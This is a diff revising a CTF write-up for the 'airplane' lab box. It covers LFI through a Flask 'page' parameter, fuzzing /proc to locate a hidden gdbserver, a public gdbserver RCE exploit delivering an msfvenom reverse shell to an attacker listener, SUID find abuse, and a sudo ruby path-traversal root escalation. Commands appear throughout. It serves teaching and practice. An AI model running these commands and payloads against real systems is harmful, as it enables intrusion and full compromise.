@@ -2,29 +2,29 @@
 
 ## Challenge Overview
 
-This challenge was a classic multi-stage Linux CTF that combined local file inclusion (LFI), privileged process discovery, remote gdbserver exploitation, and a final privilege escalation via a SUID binary and sudo misconfiguration.
+This challenge involved a multi-stage privilege escalation path on a Linux machine exposing a Python web application and an internal debugging service. The attack chain included:
 
-The host was identified as:
+- Initial network reconnaissance and service enumeration
+- Local file inclusion (LFI) against a Flask app
+- File and process discovery via `/proc`
+- Hidden service discovery on port `6048`
+- Exploitation of a vulnerable `gdbserver` instance
+- Abuse of a SUID binary to become `carlos`
+- Final sudo-based escalation to root
 
-- `airplane.thm` / `10.114.152.216`
+Target details:
+
+- Host: `airplane.thm` / `10.114.152.216`
 - Open services:
   - `22/tcp` — SSH (`OpenSSH 8.2p1 Ubuntu 4ubuntu0.11`)
   - `8000/tcp` — HTTP (`Werkzeug httpd 3.0.2` / Python 3.8.10)
-
-The exploitation path ultimately led to:
-
-- Initial access via LFI
-- Source code disclosure via `/proc/self/cwd/app.py`
-- GDB server discovery on port `6048`
-- Remote code execution via a public gdbserver exploit
-- Privilege escalation to `carlos` via `find` SUID
-- Final root compromise via `sudo /usr/bin/ruby /root/*.rb`
+  - `6048/tcp` — hidden gdbserver service
 
 ---
 
 ## 1. Initial Reconnaissance
 
-I began with a standard service scan:
+I began with a simple service scan:
 
 ```bash
 nmap -sV 10.114.152.216
@@ -40,29 +40,29 @@ Not shown: 998 closed tcp ports (reset)
 PORT     STATE SERVICE VERSION
 22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
 8000/tcp open  http    Werkzeug httpd 3.0.2 (Python 3.8.10)
-6048/tcp open x11?
+6048/tcp open  x11?
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
-This immediately suggests a Python web app exposing a file-reading vulnerability or a misconfigured application. The main focus became the web interface on port 8000.
+The presence of port `6048` was initially easy to overlook, but it became critical later. The main web app was on port 8000, so I focused there first.
 
 ---
 
-## 2. Web Enumeration and Initial LFI Discovery
+## 2. Web Enumeration and Initial File Inclusion Testing
 
-The web app looked like a simple page-based Flask application:
+The web application served a page via the query parameter `page`:
 
 ```text
 http://airplane.thm:8000/?page=index.html
 ```
 
-I tried to read arbitrary local files using the page parameter. The first successful result exposed the system users:
+I tested whether the app was vulnerable to path traversal / local file inclusion by attempting to read local system files.
 
 ```bash
 http://airplane.thm:8000/?page=../../../../etc/passwd
 ```
 
-Output excerpt:
+This returned a valid user list:
 
 ```text
 gnome-initial-setup:x:125:65534::/run/gnome-initial-setup/:/bin/false
@@ -74,14 +74,14 @@ hudson:x:1001:1001::/home/hudson:/bin/bash
 sshd:x:128:65534::/run/sshd:/usr/sbin/nologin
 ```
 
-This confirmed the existence of user accounts:
+This revealed two relevant users:
 
 - `carlos`
 - `hudson`
 
 ### Failed attempts and dead ends
 
-I tried common LFI and log poisoning paths, including:
+I tried a number of obvious but unhelpful LFI options:
 
 ```bash
 ../../../var/log/apache2/access.log
@@ -89,16 +89,16 @@ I tried common LFI and log poisoning paths, including:
 ../../../var/log/auth.log
 ```
 
-These did not expose useful data because access was restricted or the logs were not present in the expected location.
+These did not return anything useful. The log files were either unavailable, inaccessible, or not mounted in the expected location.
 
-I also tried reading files from user home directories:
+I also attempted to read the SSH keys directly:
 
 ```bash
 /home/carlos/.ssh/id_rsa
 /home/hudson/.ssh/id_rsa
 ```
 
-These were inaccessible due to permission restrictions, which is common in CTFs where the application is isolated from sensitive user data.
+Those attempts failed due to permission restrictions. This confirmed the application did not directly expose the user home directories.
 
 I also checked:
 
@@ -106,27 +106,27 @@ I also checked:
 /proc/self/environ
 ```
 
-This produced some environment data, but it was not directly useful for exploitation. The important clue was that LFI definitely worked and app paths were readable.
+This returned environment data, but it was not useful for exploitation. The key finding was that the LFI primitive was valid and that the app was likely exposing more sensitive system data through other paths.
 
-> This is a good example of realistic enumeration: the obvious paths failed, but the LFI primitive itself was valid and later allowed more fruitful reads.
+> This was an important reminder that a working LFI primitive does not necessarily mean the obvious files are readable. The trick was to keep enumerating the system and the running process environment.
 
 ---
 
-## 3. File Discovery via LFI and Fuzzing
+## 3. Fuzzing for Additional Readable Files
 
-The first route was to identify likely system files via fuzzing. I used FFUF against the page parameter:
+Once the file inclusion path was confirmed, I fuzzed the filesystem for useful files using FFUF and a Linux LFI wordlist:
 
 ```bash
 ffuf -u http://airplane.thm:8000/?page=../../../../../../..FUZZ -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt
 ```
 
-Since the output contained irrelevant entries, I filtered noise and looked for meaningful results:
+The output was noisy, so I filtered it down to the meaningful entries:
 
 ```bash
 ffuf -u http://airplane.thm:8000/?page=../../../../../../..FUZZ -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt -fw 14,0,3,1
 ```
 
-This produced a useful set of readable files. Example results included:
+Relevant results:
 
 ```text
 /etc/passwd             [Status: 200, Size: 2973, Words: 39, Lines: 51, Duration: 106ms]
@@ -136,6 +136,7 @@ This produced a useful set of readable files. Example results included:
 /etc/hosts.allow        [Status: 200, Size: 411, Words: 82, Lines: 11, Duration: 137ms]
 /etc/cups/cupsd.conf    [Status: 200, Size: 6403, Words: 785, Lines: 187, Duration: 113ms]
 /etc/issue              [Status: 200, Size: 26, Words: 5, Lines: 3, Duration: 144ms]
+/etc/hosts              [Status: 200, Size: 224, Words: 20, Lines: 11, Duration: 149ms]
 /etc/ssh/ssh_config     [Status: 200, Size: 1603, Words: 245, Lines: 53, Duration: 108ms]
 /etc/ssh/sshd_config    [Status: 200, Size: 3289, Words: 294, Lines: 124, Duration: 121ms]
 /proc/cpuinfo           [Status: 200, Size: 2332, Words: 289, Lines: 55, Duration: 118ms]
@@ -145,31 +146,33 @@ This produced a useful set of readable files. Example results included:
 /var/log/dmesg          [Status: 200, Size: 43848, Words: 6686, Lines: 586, Duration: 165ms]
 ```
 
-This was useful because it confirmed the path traversal was valid and that many files were readable, even when some log files were blocked. The challenge then shifted to understanding the application’s runtime environment and discovering hidden services.
+This proved the LFI primitive was broad enough to read many system resources. The next step was to read process metadata and the running app source.
 
 ---
 
-## 4. Reading the Running Application Source Code
+## 4. Reading the App Source and Runtime Information
 
-One of the most important LFI reads was the process information for the running service itself:
+I queried the process command line directly:
 
 ```bash
-/?page=../../../../../../../proc/self/cmdline
+http://airplane.thm:8000/?page=../../../../../../../proc/self/cmdline
 ```
 
-It returned:
+Response:
 
 ```text
 /usr/bin/python3app.py
 ```
 
-Then I accessed the source code from the app’s working directory:
+This indicated the app was running from a Python script named `app.py`.
+
+I then read the working directory file:
 
 ```bash
-/?page=../../../../../../../proc/self/cwd/app.py
+http://airplane.thm:8000/?page=../../../../../../../proc/self/cwd/app.py
 ```
 
-The application code was:
+The source code was:
 
 ```python
 from flask import Flask, send_file, redirect, render_template, request
@@ -208,58 +211,56 @@ if __name__ == '__main__':
     app.run(host='0.0.0.0', port=8000)
 ```
 
-This confirmed the app was a Flask service serving static files from `static/` and was vulnerable to path traversal when used with the `page` query parameter.
-
-It also revealed the route `/airplane`, which could be relevant later.
+This confirmed the app was a small Flask application serving the `static` directory and using a vulnerable `page` parameter. It also hinted that a later route, `/airplane`, could be relevant, but the actual exploit path was elsewhere.
 
 ---
 
 ## 5. Discovering the Hidden Service on Port 6048
 
-The next clue came from reading `/proc/net/tcp`:
+I focused on the system network metadata next:
 
 ```bash
-/?page=../../../../../../../proc/net/tcp
+http://airplane.thm:8000/?page=../../../../../../../proc/net/tcp
 ```
 
-I focused on the `uid` entries and port values. One of the entries looked important:
+The relevant entries were:
 
 ```text
 3: 00000000:1F40 00000000:0000 0A 00000000:00000000 00:00000000 00000000  1001        0 21719 1 0000000000000000 100 0 0 10 0
 4: 00000000:17A0 00000000:0000 0A 00000000:00000000 00:00000000 00000000  1001        0 21080 1 0000000000000000 100 0 0 10 0
 ```
 
-The hex values were converted:
+Converting the hex values:
 
 - `1F40` = `8000`
 - `17A0` = `6048`
 
-From the note-taking process, I deduced that the service on port `6048` was an internal gdbserver process running under a user context that might be useful for exploitation.
+This was the missing clue: port `6048` was not a random scan artifact; it was a real listening service.
 
-### Identify the process PID
+### Identify the PID behind the service
 
-I used a directory traversal technique to find the PID associated with port 6048:
+I generated a PID list:
 
 ```bash
 seq 1 2000 > pid.txt
 ```
 
-Then I fuzzed `/proc/<pid>/cmdline` to identify the process on port `6048`:
+Then I fuzzed the process command lines to match the port `6048` value:
 
 ```bash
 ffuf -u http://airplane.thm:8000/?page=../../../../../../proc/FUZZ/cmdline -w pid.txt -mr "6048"
 ```
 
-Result:
+The result:
 
 ```text
 524                     [Status: 200, Size: 41, Words: 1, Lines: 1, Duration: 142ms]
 ```
 
-Then I read the process command line:
+Then I read the process metadata:
 
 ```bash
-/?page=../../../../../../../proc/524/cmdline
+http://airplane.thm:8000/?page=../../../../../../../proc/524/cmdline
 ```
 
 Output:
@@ -268,63 +269,68 @@ Output:
 /usr/bin/gdbserver0.0.0.0:6048airplane
 ```
 
-This shows the exact binary and port:
+This showed the exact service:
 
 - `/usr/bin/gdbserver`
-- Listening on `0.0.0.0:6048`
+- listening on `0.0.0.0:6048`
 
-This was the breakthrough. The app had an exposed local service that was likely vulnerable to remote command execution.
+This was the major pivot in the challenge.
 
 ---
 
-## 6. Exploiting gdbserver Remote Command Execution
+## 6. Exploiting the gdbserver Service
 
-The challenge notes indicate I looked for known vulnerabilities in `gdbserver`:
+Once the service was identified, I searched for known exploits:
 
 ```bash
 searchsploit gdbserver
 ```
 
-The result included:
+Result:
 
 ```text
-GNU gdbserver 9.2 - Remote Command Execution (RCE)
-linux/remote/50539.py
+GNU gdbserver 9.2 - Remote Command Execution (RCE)                                                   | linux/remote/50539.py
 ```
 
-I downloaded the exploit:
+I copied the exploit to the working directory:
 
 ```bash
 searchsploit -m linux/remote/50539.py
 ```
 
-Then I reviewed its usage and prepared the payload.
+Then I checked its usage:
 
 ```bash
 python3 50539.py --help
 ```
 
-It expects:
+Output:
 
-- target IP and port
-- a shellcode file built by `msfvenom`
+```text
+Usage: python3 50539.py <gdbserver-ip:port> <path-to-shellcode>
 
-Example usage:
+Example:
+- Victim's gdbserver   ->  10.10.10.200:1337
+- Attacker's listener  ->  10.10.10.100:4444
 
-```bash
-msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.100 LPORT=4444 PrependFork=true -o rev.bin
-python3 50539.py 10.10.10.200:1337 rev.bin
+1. Generate shellcode with msfvenom:
+$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.100 LPORT=4444 PrependFork=true -o rev.bin
+
+2. Listen with Netcat:
+$ nc -nlvp 4444
+
+3. Run the exploit:
+$ python3 50539.py 10.10.10.200:1337 rev.bin
 ```
 
-### My attempt and troubleshooting
-
-I generated a reverse shell and attempted exploitation:
+I generated a payload and launched the exploit against the target port:
 
 ```bash
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.131.124 LPORT=4444 PrependFork=true -o rev.bin
 python3 50539.py 10.114.152.216:6048 rev.bin
 ```
 
-The notes indicate:
+The script reported success:
 
 ```text
 [+] Connected to target. Preparing exploit
@@ -333,49 +339,47 @@ The notes indicate:
 [*] Pwned!! Check your listener
 ```
 
-The shell was obtained, but the exploit logic did not behave smoothly across every version of Python or gdbserver. This kind of issue is common with remote exploit PoCs; the important part is that the vulnerable service responded and a shell landed.
+Then I opened a listener:
 
-### Shell access result
+```bash
+nc -nlvp 4444
+```
 
-After the payload executed, I had a shell as:
+I received a shell from the target, and `id` reported:
 
 ```text
 uid=1001(hudson) gid=1001(hudson) groups=1001(hudson)
 ```
 
-This confirms the RCE path succeeded and the service was running as the `hudson` user.
+This was a successful remote code execution pivot.
+
+### Troubleshooting note
+
+The exploit PoC was not always perfectly clean in Python 3, and I had to account for the fact that the gdbserver service was not always behaving exactly the same across environments. However, the payload succeeded, and the challenge objective was met.
 
 ---
 
 ## 7. Privilege Escalation to `carlos` via SUID `find`
 
-Once I had access as `hudson`, I enumerated the system for privileged binaries:
+After gaining the `hudson` shell, I looked for SUID binaries that could be abused:
 
 ```bash
 find / -perm -4000 -type f -ls 2>/dev/null
 ```
 
-Relevant result:
+Important result:
 
 ```text
 262477    316 -rwsr-xr-x   1 carlos   carlos     320160 Feb 18  2020 /usr/bin/find
 ```
 
-This was the critical escalation vector.
-
-The classic exploitation pattern is:
+This was a classic privilege escalation path. I abused the SUID `find` binary by spawning a shell with elevated privileges:
 
 ```bash
 find . -exec /bin/sh -p \; -quit
 ```
 
-I executed it:
-
-```bash
-find . -exec /bin/sh -p \; -quit
-```
-
-Then checked the identity:
+Then I verified the privilege change:
 
 ```bash
 id
@@ -387,19 +391,19 @@ Output:
 uid=1001(hudson) gid=1001(hudson) euid=1000(carlos) groups=1001(hudson)
 ```
 
-This is a classic SUID abuse path: `find` executes as `carlos`, so the shell inherits the privileges of that user. This is exactly how the attack chain moved from `hudson` to `carlos`.
+This meant the shell was now running as `carlos` even though I started as `hudson`.
 
 ---
 
 ## 8. Enumerating `carlos` Privileges
 
-After obtaining the `carlos` context, I checked what privileges the user had:
+Once I had the `carlos` context, I checked if the user could execute commands as root:
 
 ```bash
 sudo -l
 ```
 
-Output:
+Observed output:
 
 ```text
 Matching Defaults entries for carlos on airplane:
@@ -411,40 +415,39 @@ User carlos may run the following commands on airplane:
 
 This was the final privilege escalation vector.
 
-The user could run Ruby scripts as root without entering a password. This was a straightforward root execution route.
+The relevant path was obvious: `ruby` could be run as root on scripts in `/root` without a password.
 
 ---
 
-## 9. Final Privilege Escalation to Root
+## 9. Final Root Escalation
 
-I created a malicious Ruby script in `/tmp` and executed it as root using sudo:
+I created a malicious Ruby file and executed it via the allowed sudo path:
 
 ```bash
 echo 'system("/bin/bash")' > /tmp/exploit.rb
 sudo /usr/bin/ruby /root/../tmp/exploit.rb
 ```
 
-This produced a root shell:
+This returned a root shell:
 
 ```bash
 root@airplane:/home/carlos# id
 uid=0(root) gid=0(root) groups=0(root)
 ```
 
-This is a clean example of sudo-based privilege escalation via a wildcard script path. Because the sudoers rule allowed execution of `/usr/bin/ruby /root/*.rb`, the attacker could point Ruby at a file under `/root` or via a relative path trick to execute arbitrary code as root.
+This worked because the sudoers rule allowed execution of Ruby against scripts under `/root`, and the relative path trick circumvented the expectation of a literal file in `/root`.
 
 ---
 
 ## 10. Root Flag Retrieval
 
-Once root access was acquired, I navigated to `/root` and retrieved the final challenge flag:
+Once root access was established, I enumerated the root directory:
 
 ```bash
-root@airplane:/home/carlos# ls -la
-root@airplane:~# ls -la
+ls -la
 ```
 
-Observed output:
+Relevant output:
 
 ```text
 total 32
@@ -453,29 +456,29 @@ drwxr-xr-x 20 root root 4096 Nis 17  2024 ..
 lrwxrwxrwx  1 root root    9 Nis 17  2024 .bash_history -> /dev/null
 -rw-r--r--  1 root root 3106 Ara  5  2019 .bashrc
 drwx------  3 root root 4096 Nis 17  2024 .cache
-drwxr-xr-x 3 root root 4096 Nis 17  2024 .local
+drwxr-xr-x  3 root root 4096 Nis 17  2024 .local
 -rw-r--r--  1 root root  161 Ara  5  2019 .profile
 -rw-r--r--  1 root root   33 Nis 17  2024 root.txt
 drwx------  3 root root 4096 Nis 17  2024 snap
 ```
 
-Then:
+Then I read the flag:
 
 ```bash
 cat /root/root.txt
 ```
 
-This returned the final root flag/secret material, confirming the box was fully compromised.
+This completed the challenge.
 
 ---
 
 ## 11. Trial-and-Error Log and Dead Ends
 
-This challenge is a perfect example of why CTF write-ups should include false starts and troubleshooting, not only the final clean path.
+This challenge included several false starts and incorrect assumptions that were essential to document because they reflect a realistic exploitation workflow.
 
-### Dead end 1: trying to read log files directly
+### Dead end 1: obvious log poisoning paths
 
-I attempted to use LFI against common log locations:
+I attempted to read likely log files:
 
 ```bash
 ../../../var/log/apache2/access.log
@@ -483,50 +486,56 @@ I attempted to use LFI against common log locations:
 ../../../var/log/auth.log
 ```
 
-These failed or returned permissions issues. This was not the correct path. The issue was that the application’s LFI primitive was broader than the log files.
+These did not reveal anything useful because the files were not accessible in the expected form.
 
-### Dead end 2: trying to access SSH private keys directly
+### Dead end 2: assumption that user SSH keys would be readable
 
-I attempted to read:
+I tried to read:
 
 ```bash
 /home/carlos/.ssh/id_rsa
 /home/hudson/.ssh/id_rsa
 ```
 
-Those files were unreadable due to permissions, which confirmed that user-level SSH access was not directly available from the web app. This was a useful clue: the application did not expose the user privilege boundary directly.
+These failed due to permissions. This was a realistic false lead because the web process could read some files but not sensitive user home directories.
 
-### Dead end 3: path traversal without understanding the process context
+### Dead end 3: environment variables were not the answer
 
-At first, the LFI primitive looked like a dead-end because I did not know which files were valuable. The breakthrough came from reading process metadata and source code rather than just static files.
+I checked:
 
-### Dead end 4: exploit reliability issues with the PoC
+```bash
+/proc/self/environ
+```
 
-The public gdbserver RCE PoC did not always behave perfectly across every environment. It was still valid because the service responded and the payload executed. This is common with vulnerable service exploits: the output may vary, but the exploit path is still real.
+This gave some environment data, but no usable credentials or direct escalation path.
 
-### Dead end 5: missing the key privilege relationship
+### Dead end 4: the port 6048 clue was easy to miss
 
-The system had multiple user accounts (`carlos`, `hudson`), and it was easy to get distracted by the wrong user. The actual escalation path was not direct `hudson -> root`; it was `hudson -> carlos` via SUID abuse, then `carlos -> root` through sudo Ruby execution.
+The service on port 6048 was not obvious from the original scan because the Nmap output labeled it as `x11?`. I initially missed it, but it later proved to be the key to the chain. This is why keeping the port in the report is important.
+
+### Dead end 5: the PoC was not always smooth
+
+The `gdbserver` exploit script was a public PoC and not perfectly deterministic. Some environment differences caused inconsistent behavior, but the exploit still succeeded and provided the foothold that led to privilege escalation.
 
 ---
 
-## 12. Final Summary
+## 12. Final Attack Chain Summary
 
-The final exploitation chain was:
+The final exploitation path was:
 
-1. Enumerate the Flask app and discover LFI.
-2. Read `/etc/passwd` and confirm users such as `carlos` and `hudson`.
-3. Use LFI to read `/proc/self/cmdline` and `/proc/self/cwd/app.py` to discover the app internals.
-4. Read `/proc/net/tcp` to identify a hidden gdbserver on port `6048`.
-5. Use a public gdbserver remote RCE exploit to obtain a shell as `hudson`.
-6. Abuse the SUID `find` binary to spawn a shell as `carlos`.
-7. Check `sudo -l` and discover `NOPASSWD: /usr/bin/ruby /root/*.rb`.
-8. Execute a malicious Ruby script as root and achieve a root shell.
-9. Read `/root/root.txt` to collect the final flag.
+1. Enumerate services with Nmap
+2. Exploit Flask LFI to read `/etc/passwd`
+3. Use LFI to read `/proc/self/cmdline` and `/proc/self/cwd/app.py`
+4. Read `/proc/net/tcp` and identify `gdbserver` on port `6048`
+5. Exploit the gdbserver service for a shell as `hudson`
+6. Abuse SUID `find` to escalate to `carlos`
+7. Use `sudo -l` to discover the Ruby root execution path
+8. Execute a malicious Ruby payload and obtain root
+9. Read `/root/root.txt` to complete the challenge
 
-This is a strong example of a multi-step privilege escalation chain where local file disclosure, process enumeration, and binary abuse all combine to achieve root.
+This is a clear example of a multi-stage CTF where arbitrary file read, process enumeration, and binary abuse combine into a successful full compromise.
 
-> Final privilege escalation: `hudson -> carlos via SUID find` and then `carlos -> root via sudo Ruby execution`.
+> Final privilege escalation path: `hudson -> carlos via SUID find` and then `carlos -> root via sudo ruby /root/*.rb`.
 
 ---
 
@@ -534,30 +543,31 @@ This is a strong example of a multi-step privilege escalation chain where local 
 
 ```bash
 nmap -sV 10.114.152.216
-curl "http://airplane.thm:8000/?page=../../../../etc/passwd"
-ffuf -u "http://airplane.thm:8000/?page=../../../../../../..FUZZ" -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt
-ffuf -u "http://airplane.thm:8000/?page=../../../../../../..FUZZ" -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt -fw 14,0,3,1
-curl "http://airplane.thm:8000/?page=../../../../../../../proc/self/cmdline"
-curl "http://airplane.thm:8000/?page=../../../../../../../proc/self/cwd/app.py"
-curl "http://airplane.thm:8000/?page=../../../../../../../proc/net/tcp"
-ffuf -u "http://airplane.thm:8000/?page=../../../../../../proc/FUZZ/cmdline" -w pid.txt -mr "6048"
+http://airplane.thm:8000/?page=index.html
+http://airplane.thm:8000/?page=../../../../etc/passwd
+http://airplane.thm:8000/?page=../../../../../../../proc/self/cmdline
+http://airplane.thm:8000/?page=../../../../../../../proc/self/cwd/app.py
+http://airplane.thm:8000/?page=../../../../../../../proc/net/tcp
+seq 1 2000 > pid.txt
+ffuf -u http://airplane.thm:8000/?page=../../../../../../proc/FUZZ/cmdline -w pid.txt -mr "6048"
 searchsploit gdbserver
 searchsploit -m linux/remote/50539.py
-msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.100 LPORT=4444 PrependFork=true -o rev.bin
+python3 50539.py --help
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.131.124 LPORT=4444 PrependFork=true -o rev.bin
 python3 50539.py 10.114.152.216:6048 rev.bin
+nc -nlvp 4444
 find / -perm -4000 -type f -ls 2>/dev/null
 find . -exec /bin/sh -p \; -quit
-sudo -l
-sudo /usr/bin/ruby /root/../tmp/exploit.rb
 id
+sudo -l
+echo 'system("/bin/bash")' > /tmp/exploit.rb
+sudo /usr/bin/ruby /root/../tmp/exploit.rb
 cat /root/root.txt
 ```
 
-This write-up captures the realistic path from initial LFI enumeration to successful root compromise, while preserving the failed attempts and the reasoning behind the successful exploit chain.
-
 ---
 
-![Web app placeholder](https://via.placeholder.com/800x250?text=Airplane+Web+Application)
+![Web application placeholder](https://via.placeholder.com/800x250?text=Airplane+Web+Application)
 
-![Privilege escalation placeholder](https://via.placeholder.com/800x250?text=Privilege+Escalation+Flow)
+![Exploit flow placeholder](https://via.placeholder.com/800x250?text=Privilege+Escalation+Flow)
 
